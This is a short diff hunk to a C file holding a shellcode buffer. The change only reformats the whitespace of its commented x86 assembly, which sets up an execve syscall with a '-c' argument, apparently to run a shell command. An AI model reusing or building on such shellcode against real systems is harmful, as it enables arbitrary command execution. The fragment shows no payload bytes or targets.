@@ -8,9 +8,9 @@ unsigned char buf[] =
 
 
 /*
-push   0xb				;preparing execve syscall {execve (%ebx , %ecx, %edx)}
+push   0xb        ;preparing execve syscall {execve (%ebx , %ecx, %edx)}
 pop    eax
-cdq    					  ;clears edx
+cdq               ;clears edx
 push   edx				;pushes 0
 pushw  0x632d			;pushes 2 bytes for execve argument [-c]
 mov    edi,esp		;put [-c] to edi
